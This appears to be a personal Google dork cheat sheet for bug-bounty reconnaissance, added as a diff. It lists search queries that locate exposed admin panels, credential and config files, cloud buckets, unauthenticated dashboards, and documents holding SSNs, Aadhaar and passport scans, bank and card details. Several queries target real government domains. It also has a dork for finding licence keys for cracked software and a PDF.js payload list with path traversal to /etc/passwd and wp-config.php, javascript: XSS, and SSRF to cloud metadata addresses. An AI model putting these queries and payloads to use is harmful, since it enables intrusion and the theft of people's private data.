@@ -1,0 +1,775 @@
+
+Basic of Google Dorks 
+
+site: - Searches within a specific website or domain
+*  Acts as a wildcard for one or more unknown words
+filetype: - Finds files of a specific type (e.g., PDF)
+ext: - Same as filetype: (alternate form)
+inurl: Searches for a single & multiple keyword in the URL
+intext - Finds pages with the term in the body text
+intitle: Finds pages with the term in the title
+index of:"/" " -Directory listing 
+
+OR - Searches for either term
+AND - Implies both terms must appear
+| - Same as OR
+- Excludes results containing the term
+() - Groups terms or operators
+"" - Exact keywords in the doubleqotes
+
+
+
+Examples:
+
+site:nasa.gov
+site:*.nasa.gov
+site:*.*.nasa.gov
+site:*.*gov.*
+
+filetype:pdf
+site:*.nasa.gov filetype:pdf
+
+ext:.xlsx
+site:*.nasa.gov ext:txt
+
+inurl:admin
+inurl:admin inurl:login
+site:*.nasa.gov inurl:admin inurl:login
+
+intext:password
+site:*.nasa.gov intext:password
+
+
+
+intitle:login
+site: *.nasa.gov intitle:password
+
+index of:/cgi
+intitle:"index of /" "/wp-content"
+site:*.gov intitle:"index of /" "database"
+
+
+
+"index of:/" access.log or error.log
+site:.*.*.nasa.gov  "Server Status" | confidential |
+site:*.nasa.gov intitle:admin OR intitle:login
+
+site:*.nasa.gov (intitle:admin OR intitle:login)
+site:*.nasa.gov -admin
+
+
+---------------------------------------------------------------
+
+site:.*.*.nasa.gov  "Server Status" | confidential | “employee only” | proprietary | top secret | classified | trade secret | internal | private
+
+https://mr-dorker.onrender.com/ automation dorking
+
+
+intitle:Welcome to Firebase Hosting inurl:firebaseapp targetname.
+
+inurl:conf | inurl:env | inurl:cgi | inurl:bin | inurl:etc | inurl:root | inurl:sql | inurl:backup | inurl:admin | inurl:php site:example[.]com
+
+inurl:"error" | intitle:"exception" | intitle:"failure" | intitle:"server at" | inurl:exception | "database error" | "SQL syntax" | "undefined index" | "unhandled exception" | "stack trace" site:example[.]com
+
+
+
+ext:txt | ext:pdf | ext:xml | ext:xls | ext:xlsx | ext:ppt | ext:pptx | ext:doc | ext:docx
+intext:“confidential” | intext:“Not for Public Release” | intext:”internal use only” || intext:”passwords” | intext:“do not distribute”
+
+
+
+ext:log | ext:txt | ext:conf | ext:cnf | ext:ini | ext:env | ext:sh | ext:bak | ext:backup | ext:swp | ext:old | ext:~ | ext:git | ext:svn | ext:htpasswd | ext:htaccess site:example[.]com
+
+
+inurl:q= | inurl:s= | inurl:search= | inurl:query= | inurl:keyword= | inurl:lang= inurl:& site:example[.]com
+
+
+site:.*.*.nasa.gov  "Server Status" | confidential | “employee only” | proprietary | top secret | classified | trade secret | internal | private
+
+
+site:s3.amazonaws.com intext:”@nasa.gov”
+
+
+site:*gov.sg ext:doc | ext:docx | ext:odt | ext:pdf | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv  intext: "phonenumber"|intext:"email"|intext:"password" 
+
+
+
+ site:*.staffs.ac.uk ext:env | ext:yaml | ext:yml | ext:json | ext:xml | ext:log | ext:sql | ext:ini | ext:bak | ext:conf | ext:config | ext:db | ext:dbf | ext:tar | ext:gz | ext:backup | ext:swp | ext:old | ext:key | ext:pem | ext:crt | ext:pfx | ext:pdf | ext:xlsx | ext:xls | ext:ppt | ext:pptx |
+
+
+
+
+
+
+site:*. ext:dat | ext:rtf | ext:ppt | ext:sdf | ext:odf | ext:exe | ext:lnk | ext:7z | ext:bin | ext:part | ext:pdb | ext:cgi | ext:crdownload | ext:ini | ext:zipx | ext:bak | ext:torrent | ext:jar | ext:sys | ext:deb | ext:sh | ext:mdb | ext:xla | ext:zip | ext:tar.gz | ext:txt | ext:json | ext:git | ext:pem | ext:bash_history | ext:db | ext:key | ext:tar | ext:log | ext:sql | ext:accdb | ext:dbf | ext:apk | ext:cer | ext:cfg | ext:rar | ext:sln | ext:tmp | ext:dll | ext:iso | ext:c | ext:cpp | ext:tgz | ext:sqlite | ext:pgsql.txt | ext:mysql.txt | ext:gz | ext:config | ext:backup | ext:bkp | ext:crt | ext:eml | ext:java | ext:lst | ext:passwd | ext:pl | ext:pwd | ext:dir | ext:orig | ext:bz2 | ext:old | ext:vbs | ext:img | ext:inf | ext:py | ext:vbproj | ext:war | ext:go | ext:psql | ext:sql.gz | ext:vb | ext:webinfo | ext:jnlp | ext:temp | ext:webproj | ext:xsql | ext:raw | ext:inc | ext:lck | ext:nz | ext:rc | ext:html.gz | ext:env | ext:yml | ext:save | ext:save.1 | ext:ovpn | ext:secret | ext:secrets | ext:access | ext:gitignore | ext:properties | ext:dtd | ext:conf | ext:configs | ext:xml | ext:rb | ext:yaml | ext:toml | ext:tar.bz2 | ext:dochtml | ext:odt | ext:pdf | ext:action | ext:adr | ext:ascx | ext:asmx | ext:axd | ext:bkf | ext:bok | ext:achee | ext:cfm | ext:cnf | ext:csr | ext:ica | ext:mai | ext:mbox | ext:mbx | ext:md | ext:nsf | ext:ora | ext:pac | ext:pcf | ext:pgp | ext:plist | ext:rdp | ext:reg | ext:skr | ext:swf | ext:tpl | ext:url | ext:wml | ext:xsd | ext:swp | ext:bac | ext:BAK | ext:NEW | ext:_bak | ext:_old | ext:bak1 | ext:lock | ext:atom | ext:_backup | ext:~ | ext:%01 | ext:(1) | ext:gzip | ext:cab | ext:mysql-pconnect | ext:mysql-connect
+
+
+
+ intitle:”index of” “/private”
+inurl:”view/view.shtml” (webcam)
+ filetype:pdf “confidential”
+ intext:”sql syntax near” “detected an internal error”
+ 	
+
+
+To get liscescns for any cracked version software: "software_name" 94fbr
+
+RCE
+
+inurl:cmd | inurl:exec= | inurl:query= | inurl:code= | inurl:do= | inurl:run= | inurl:read= | inurl:ping= inurl:& site:example[.]com
+
+
+intitle:"index of /" intext:".env"
+
+"feedback" ext:xlsx intext:"@gmail.com" ----> Importatnt
+
+"Leaked_contract" ext:docx intext:"@gmail.com" ----> Importatnt
+
+site:"*.nasa.gov" | "slack"
+site:domain.com "join.slack"
+site:domain.com "join.slack" ext:pdf
+site:domain.com "join.slack" ext:doc
+site:domain.com "join.slack" ext:docx
+
+site:*.gov "minutes of meeting" ext:txt
+
+
+odt,odf,csv,xls,xlsx,txt....
+
+ccTLD 🔍
+
+It stands for country code top-level domain.
+
+site:philips.* -site:philips.com
+
+
+site:*.domain.tld
+site:*-*.domain.tld
+site:*-*.*.domain.tld
+site:*-*.*.*.domain.tld
+site:*-*-*.*.*.domain.tld
+
+intitle:"index of /" "aadhaar" intext:.jpg
+intitle:"index of /" "aadhaar" intext:.jpeg
+intitle:"index of /" "aadhaar" intext:.png
+intitle:"index of /" "aadhaar"  inurl:upload
+intitle:"index of /" "passport"  inurl:uploads
+intitle:"index of /" "SSN"  inurl:upload
+intitle:"index of /" "SSN"  inurl:private
+intitle:"index of /" "SSN"  inurl:documents
+intitle:"index of /" "social security number"  inurl:upload
+
+
+1️⃣ SOURCE CODE FILES
+site:domain.com ext:py
+
+
+3️⃣ APPLICATION IN DEVELOPMENT PHASE
+site:app-dev.*.*
+site:app-dev.*.io
+site:app-dev.*.com
+site:app-dev.*.org
+site:app-dev.*.net
+site:app-dev.*.ai
+
+1️⃣ Endpoints utilizing PDF.js library to render PDF documents
+inurl:pdfjs inurl:& site:*.gov
+inurl:pdfjs inurl:& site:*.gov.*
+
+com,ai,gov,edu,net,org,in,uk,au,jp,nl,de,fr......
+
+
+#or just grep from waymore or waybackurls output
+waymore -i domain.com -mode U -oU waymore_urls.txt
+cat waymore_urls.txt | grep "pdfjs"
+Example:
+
+https://domain[.]com/assets/pdfjs/web/viewer.html?file=...............
+https://domain[.]com/wp-content/plugins/pdfjs-viewer-shortcode/pdfjs/web/viewer.php?file=......
+file=https://your-domain.com/malwarefile.extension
+Path Traversal & LFI
+file=../../../../wp-config.php
+file=../../../../../../../../etc/passwd
+XSS
+file=javascript:prompt()
+SSRF
+file=http://burp-collaborator-url
+#only receiving HTTP & DNS pingback not enough
+#cloud metadata or internal port scanning poc needed to be triaged
+
+#AWS metadata
+file=http://169.254.169.254/latest/meta-data/
+
+#ALIBABA cloud metadata
+file=http://100.100.100.200/latest/meta-data/
+HTTP Parameter Pollution leading to other bugs
+file=original_normal_url&file=lfi_payload_here
+file=original_normal_url&file=xss_payload_here
+file=original_normal_url&file=ssrf_payload_here
+-----------------------------------------------------------
+2️⃣ IPv4 Dorking
+"keyword" (site:*.*.255.* |site:*.*.254.* |site:*.*.253.* |site:*.*.252.* |site:*.*.251.* |site:*.*.250.* |s
+
+
+4️⃣ Real-time Update Pages
+Pages that might depend on real time data without relying on old cached data.
+
+site:domain.com inurl:nocache inurl:TRUE
+
+
+5️⃣ E-Commerce Web App SQLi endpoints
+One example of endpoint where we might have more chances or probability of getting SQLi.
+
+inurl:storefrontb2bweb
+inurl:storefrontb2bweb inurl:&
+inurl:storefrontb2bweb inurl:?
+inurl:storefrontb2bweb inurl:=
+
+
+cat waymore_output_urls.txt | grep "storefrontb2web" | sort -u > sqli_test.txt
+
+1️⃣ AWS S3 BUCKET
+site:*.s3.amazonaws.com
+site:*.s3.amazonaws.com "company"
+site:*.s3.amazonaws.com "domain.com"
+site:*.s3.amazonaws.com inurl:company
+site:*.edu.s3.amazonaws.com
+site:*.edu.*.s3.amazonaws.com
+site:*.gov.*.s3.amazonaws.com
+site:*.gov.s3.amazonaws.com
+
+
+1. Use extensions like pdf,doc,docx,xls,xlsx,txt,....
+2. Use keywords like CONFIDENTIAL,HIGHLY CONFIDENTIAL,COMPANY SENSITIVE,etc..
+3. Use sensitive strings like "date of birth","default credential", "password",etc..
+4. Use financial keywords like "bank account", "credit card", "IFSC",etc..
+
+2️⃣ GOOGLE DRIVE
+site:*.ac.uk "drive.google.com/drive/"
+site:drive.google.com inurl:/drive/folders "company"
+site:domain.com "drive.google.com/drive/folders"
+site:domain.com "drive.google.com/drive/"
+site:domain.com "drive.google.com"
+site:domain.com "drive.google.com/drive/file/d"
+site:domain.com "drive.google.com/drive/file"
+site:domain.com "drive.google.com/drive/u/0"
+site:domain.com "drive.google.com/drive/u/1"
+
+
+3️⃣ MICROSOFT AZURE
+site:*.core.windows.net
+4️⃣ IBM CLOUD
+site:*.appdomain.cloud
+site:*.cloud.ibm.com
+5️⃣ GOOGLE CLOUD
+site:firebasestorage.googleapis.com
+
+
+ 5️⃣ REMOTE DESKTOP WEB CONNECTION
+"Server" "Size" "Send logon information for this connection"
+
+1️⃣ SPRINGBOOT ACTUATOR ENDPOINTS
+inurl:/actuator/prometheus "jvm_memory_max_bytes"
+inurl:/actuator/prometheus "jvm_gc_pause_seconds"
+
+/actuator/conditions
+/actuator/configprops
+/actuator/loggers
+/actuator/threaddump
+/actuator/scheduledtasks
+/actuator/mappings
+
+#CRITICAL ENDPOINTS that might lead to critical severity bug
+inurl:/actuator/env
+inurl:/actuator/heapdump
+
+DORK2: Website Traffic Statistics📊
+inurl:/plesk-stat/webstat "2024"
+inurl:/plesk-stat/webstat "2023"
+
+DORK1: Roxy File Manager Unauth Access📂
+intitle:"Roxy file manager"
+
+DORK3: Prometheus Server Unauth Dashboard🖲️
+"Prometheus Time Series Collection and Processing Server"
+
+DORK4: SideKiq Instance🔴
+inurl:/sidekiq intext:"memory usage" intext:"polling interval"
+
+DORK5: X-Prober Server Information Disclosure🔵
+intitle:xprober intext:CPU
+inurl:/xprober ext:php
+
+
+DORK6: Unauth Dashboard Running at port 8080🪲
+inurl:8080/dashboard
+
+DORK7: Unauth Dashboard Running at port 8081🐞
+inurl:8081/dashboard
+
+Installation Wizard Unauth Access🧙
+"iTop Installation Wizard" "Prerequisites validation"
+
+
+1️⃣UNAUTH SHARE DRIVES🗃️
+"Powered by ZFile"
+
+2️⃣FILE UPLOAD📂
+Find endpoints where we can test File upload functionality.
+
+site:domain.com "Choose File"
+site:domain.com "No file chosen"
+site:domain.com "Upload"
+site:domain.com "Upload here"
+site:domain.com "Upload a file"
+site:domain.com "Please upload your"
+
+PASTEBIN INFORMATION DISCLOSURE🗑️
+site:pastebin.com "domain.com"
+
+5️⃣ ADOBE EXPERIENCE MANAGER WEBAPPS
+inurl:/libs/granite/core
+inurl:/content/dam
+
+#INFORMATION DISCLOSURE
+inurl:/content/dam ext:xls
+inurl:/content/dam ext:xlsx
+
+
+symphony:
+How to use this in targeted hunting?
+1️⃣ TARGETED DORKING
+
+site:domain.com inurl:app_dev.php
+site:domain.com inurl:app_dev
+site:domain.com inurl:_profiler
+site:domain.com inurl:profiler
+
+
+1️⃣ CALL TO UNDEFINED FUNCTION
+"Uncaught Error: Call to undefined function"
+2️⃣ ERROR IN YOUR SQL
+"error in your SQL"
+
+3️⃣ WORDPRESS DATABASE ERROR
+"WordPress database error:"
+
+ PHP FATAL ERROR
+"PHP Fatal"
+
+5️⃣ NOT FOUND
+"not found in C:\"
+"not found in D:\"
+"not found in E:\"
+"not found in F:\"
+
+6️⃣ UNCLOSED QUOTATION
+"Unclosed quotation mark"
+
+
+8️⃣ MYSQL FUNCTIONS
+"mysql_num_rows()" "error"
+"mysql_fetch_array()" "error"
+"mysql_query()" "error"
+
+
+1️⃣ OAUTH
+site:domain.com / site:*.domain.com
+
+#set1
+site:domain.com "Continue with Google"
+site:domain.com "Sign in with Google"
+site:domain.com "Login with Google"
+
+
+#set2
+site:domain.com "Sign in using"
+site:domain.com "Authenticate with Google"
+
+
+#set3
+site:domain.com "Authenticate with"
+
+
+
+2️⃣SWAGGER
+site:domain.com inurl:swagger
+3️⃣ FORGOTTEN WEB-PAGES
+site:*.gov ext:old
+
+
+ EXPOSED GRAFANA DASHBOARD
+intitle:"Grafana" inurl:"/dashboard/db"
+
+
+5️⃣ UNAUTH ADMIN SETUP PAGE
+"set up the administrator user" inurl:pivot
+
+
+Wp:
+wp-config.php-bak
+/wp-config.php.bak
+/wp-config.php.new
+/wp-config.php.old
+/wp-config.php_Old
+/wp-config.php_bak
+/wp-config.php_new
+/wp-config.php_old
+/wp-config.bak
+
+/wp-config.php_2024
+/wp-config.php.bak_2024
+/wp-config.php.2024_backup
+
+
+ XLS & XLSX
+inurl:wp-content/uploads/ ext:xlsx site:domain.com
+inurl:wp-content/uploads/ ext:xls site:domain.com
+inurl:wp-content/uploads/ ext:xls "@gmail.com" site:domain.com
+inurl:wp-content/uploads/ ext:xlsx "@gmail.com" site:domain.com
+inurl:wp-content/uploads/ ext:xls "date of birth" site:domain.com
+inurl:wp-content/uploads/ ext:xlsx "date of birth" site:domain.com
+inurl:wp-content/uploads/ ext:xls "INTERNAL USE ONLY" site:domain.com
+inurl:wp-content/uploads/ ext:xlsx "INTERNAL USE ONLY" site:domain.com
+2️⃣ PDF
+inurl:wp-content/uploads/ ext:pdf site:domain.com
+inurl:wp-content/uploads/ ext:pdf "@gmail.com" site:domain.com
+inurl:wp-content/uploads/ ext:pdf "date of birth" site:domain.com
+inurl:wp-content/uploads/ ext:pdf "INTERNAL USE ONLY" site:domain.com
+inurl:wp-content/uploads/ ext:pdf "INTERNAL USE ONLY" site:domain.com
+Try other extensions as well apart from xlsx,xls and pdf like:
+
+odt, odf
+doc, docx
+csv
+db
+sql
+ini
+config, conf
+ppt, pptx
+zip
+
+3️⃣ BACKUP FUZZING
+	
+Use this as part of custom fuzzing as well.
+
+inurl:/wp-content/backup-FUZZ #hyphen
+inurl:/wp-content/backup_FUZZ #underscore
+
+
+DIRECTORY LISTING
+intitle:index of /wp-content
+intitle:index of /wp-content/uploads
+intitle:index of /wp-content/bak
+intitle:index of /wp-content/backup
+intitle:index of /wp-content/2024
+
+
+5️⃣ PRIVATE DIRECTORY
+inurl:/wp-content/ inurl:private
+inurl:/wp-content/ inurl:internal
+
+
+1️⃣ SPLASHMODAL API ENDPOINT
+inurl:/api/v1/splashmodal site:domain.com
+inurl:/api/v1/splashmodal site:*.domain.com
+inurl:/api/v1/splashmodal site:*.gov
+inurl:/api/v1/splashmodal site:*.gov.*
+inurl:/api/v1/splashmodal site:*.ai
+inurl:/api/v1/splashmodal site:*.edu
+inurl:/api/v1/splashmodal site:*.edu.*
+inurl:/api/v1/splashmodal site:*.org
+inurl:/api/v1/splashmodal site:*.net
+inurl:/api/v1/splashmodal site:*.nl
+inurl:/api/v1/splashmodal site:*.com
+
+#in general stuff
+inurl:/api/v1/ site:domain.com
+inurl:/api/v2/ site:domain.com
+inurl:/api/v3/ site:domain.com
+inurl:/api/v4/ site:domain.com
+
+
+2️⃣ WEB RESOURCE
+inurl:webresource
+inurl:webresource inurl:.axd
+inurl:webresource inurl:&
+inurl:webresource inurl:?
+
+inurl:_vti_bin inurl:asmx
+inurl:asmx inurl:services
+inurl:wsdl inurl:services
+inurl:wsdl inurl:web
+inurl:wsdl inurl:server
+
+
+4️⃣ .ASHX
+ASP.NET Web Handler files
+
+To serve dynamically generated content : images or files.
+To process data from embedded forms or other requests.
+Endpoints for APIs or custom web based logic.
+inurl:.ashx inurl:&
+inurl:/Handlers/PdfHandler
+inurl:.ashx? inurl:=
+https://domain[.]com/Handlers/PdfHandler.ashx?id=numberhere
+#combine them
+inurl:print 
+inurl:view 
+inurl:export
+
+
+5️⃣ ALIST
+Just another storage provider.
+
+"Powered by AList"
+
+How I got 200$$$
+site:domain.com ext:pdf
+site:domain.com ext:pdf "CONFIDENTIAL"
+site:domain.com ext:pdf "STRICTLY CONFIDENTIAL"
+site:domain.com ext:pdf "HIGHLY CONFIDENTIAL"
+site:domain.com ext:pdf "PRIVATE"
+site:domain.com ext:pdf "PRIVATE AND CONFIDENTIAL"
+site:domain.com ext:pdf "PRIVATE AND SENSITIVE"
+site:domain.com ext:pdf "TRADE SECRET"
+site:domain.com ext:pdf "NOT FOR DISTRIBUTION"
+site:domain.com ext:pdf "NOT FOR PUBLIC RELEASE"
+site:domain.com ext:pdf "EMPLOYEE ONLY"
+site:domain.com ext:pdf "INTERNAL USE ONLY"
+site:domain.com ext:pdf "INTERNAL ONLY"
+site:domain.com ext:pdf "COMPANY SENSITIVE"
+
+
+🪲Google Dork
+"Prometheus Time Series Collection and Processing Server" -site:prometheus.io
+
+site:prometheus.*.*.gov
+site:prometheus.*.gov
+site:prometheus.*.*.gov.*
+site:prometheus.*.gov.*
+
+gov,edu,org,com,net,ai,in,au,uk,nl,de,jp
+
+
+1️⃣ Open Jenkins Instances
+intitle:"Dashboard [Jenkins]" Credentials
+
+
+
+Atlassian Confluence Dashboard
+
+#related CVE: CVE-2019-3396
+intitle:dashboard-confluence
+
+
+inurl:http://confluence. login.action
+inurl:https://wiki. .com/confluence/
+allinurl: /confluence/login.action?
+"/spacedirectory/view.action"
+"/pages/viewpage.action?"
+"/pages/releaseview.action?"
+"aboutconfluencepage.action"
+
+
+ phpMyAdmin
+inurl:main ext:php "Welcome to phpMyAdmin" "running on"
+"Welcome to phpMyAdmin" "running on" inurl:main.php
+inurl:main.php phpMyAdmin
+inurl:main.php "Welcome to phpMyAdmin"
+inurl:sql.php "phpmyadmin"
+inurl:sql "phpmyadmin"
+
+
+4️⃣ AWS S3 BUCKET
+site:*.s3.amazonaws.com
+site:*.*.s3.amazonaws.com
+site:*.*.*.s3.amazonaws.com
+inurl:"s3.amazonaws.com"
+
+site:*.s3.amazonaws.com intitle:Bucket loading
+
+
+
+5️⃣ KIBANA DASHBOARD
+
+inurl:kibana inurl:app
+inurl:kibana inurl:app inurl:5601
+
+#default port 5601, similarly make shodan dork for it as well
+
+
+Banking
+site:domain.com "Credit Card" ext:pdf
+site:domain.com "Credit Card No" ext:pdf
+site:domain.com "Credit Card Number" ext:pdf
+site:domain.com "Bank Name" ext:pdf
+site:domain.com "Bank Account" ext:pdf
+site:domain.com "Bank Account Holder" ext:pdf
+site:domain.com "Beneficiary" ext:pdf
+site:domain.com "Beneficiary Name" ext:pdf
+site:domain.com "IFSC" ext:pdf
+site:domain.com "Cardholder" ext:pdf
+site:domain.com "Card Holder" ext:pdf
+site:domain.com "Swift" ext:pdf
+site:domain.com "Swift Code" ext:pdf
+
+"feedback" ext:xlsx intext:"@gmail.com"  -> Important 
+
+
+#extensions
+pdf,csv,xls,xlsx,doc,docx,odt,odf
+
+#inurl keywords
+inurl:attachment
+inurl:attach
+inurl:attachments
+
+
+1️⃣ GEOSERVER
+inurl:"/geoserver/ows?service=wfs" site:*.gov
+
+#use nuclei and hunt for CVE vulnerabilities for geoserver
+nuclei -l urls_endpoints.txt -tags geoserver -severity critical,high,medium
+
+3️⃣ Unauthenticated File Upload Endpoints
+While it may not narrow down directly to the most unauthenticated ones, but helps to find interesting endpoints where might be some possibility for it.
+
+#matching via keywords in URL
+site:domain.com inurl:upload 
+site:domain.com inurl:uploadfile
+
+//we combine with below extensions
+ext:php
+ext:asp
+ext:aspx
+ext:do
+ext:action
+ext:jsp
+ext:jspx
+ext:ashx
+ext:axd
+ext:xd
+
+
+#If ext value doesn't work , we use like inurl:.php (dot)
+
+
+#matching via keywords in HTML DOM
+site:domain.com "Choose File"
+site:domain.com "No file chosen"
+site:domain.com "Upload"
+site:domain.com "Upload here"
+site:domain.com "Upload a file"
+site:domain.com "Please upload your"
+
+
+4️⃣ PORT NUMBER + DASHBOARD
+inurl:portnumberhere inurl:dashboard
+5️⃣ WORDPRESS NUCLEI TESTING
+#find wordpress endpoints
+intitle:"index of /wp-content"
+
+
+
+1️⃣ GET API
+
+intitle:"GET api/" site:gov
+intitle:"GET api/" site:gov.*
+intitle:"GET api/" site:edu
+intitle:"GET api/" site:TLD
+intitle:"GET api/" site:ccTLD
+
+title:"GET api/" site:gov "/all"
+intitle:"GET api/" site:gov "/list"
+intitle:"API" "application/json" "List of" site:gov
+intitle:"GET api/" site:gov "Get all"
+intitle:"GET api/" site:gov "Get a"
+
+
+2️⃣ Create Method
+
+"CREATE /" "API" inurl:doc site:gov
+3️⃣ Post Method
+
+"POST /" "API" inurl:doc site:gov
+
+4️⃣ Put Method
+
+"PUT /" "API" inurl:doc site:gov
+"PUT /v1" "API" inurl:doc -site:github.com
+"PUT /v2" "API" inurl:doc -site:github.com
+
+6️⃣ Delete Method
+
+intitle:"DELETE" site:gov "application/json"
+
+
+📥 Download Spec
+
+"APIs" "Protected by reCAPTCHA" inurl:docs "DOWNLOAD SPEC"
+
+🖋️Edit on Github
+
+inurl:api "Edit on Github" -site:github.com
+📖Available on Github
+
+"available on Github" "API" inurl:doc -site:github.com -site:github.io -inur:gitlab -sit
+
+
+📚Redoc API Documentation
+
+inurl:/redoc "application/json" -site:github.com -site:redoc.com
+
+#more things to combine or remove
+inurl:/v1/redoc
+inurl:/v2/redoc
+v3,v4,........
+"application/"
+
+📙Stoplight Powered API Documentation
+
+"API" inurl:doc "Powered by Stoplight" -site:stoplight.io -site:github.io -site:github.cm
+
+📚Slate Powered API Documentation
+
+"API" inurl:doc "Powered by Slate" -site:medium.com -site:github.com
+"API" inurl:api "Powered by Slate" -site:medium.com -site:github.com
+"API" inurl:v1 "Powered by Slate" -site:medium.com -site:github.com
+"API" inurl:v2 "Powered by Slate" -site:medium.com -site:github.com
+
+#positive filtering
+"REST API"
+
+#negative filtering
+-"REST API"
+-site:github.io
+-inurl:gitlab
+
+
+
+📕Aglio Generated API Documentation
+
+"Generated by aglio" "API" inurl:api inurl:doc -site:github.com -site:github.io
+"Aglio" "API" inurl:api inurl:doc -site:github.com -site:github.io
+
+📙API documentation by Redocly
+
+"API docs by Redocly" -site:github.com
+
+
+📗Swagger Hub API Documentation
+
+#with space
+"Swagger Hub"  site:gov -ext:pdf
+
+#without space
+"SwaggerHub"  site:gov -ext:pdf
+
+
+"app.swaggerhub.com" -site:swaggerhub.com -site:swagger.io site:gov.*
+
+📊GraphQL
+
+"API" inurl:doc "GraphQL" -site:github.com -site:gitlab.com
+inurl:doc "mutation" "GraphQL" -site:github.com -site:gitlab.com
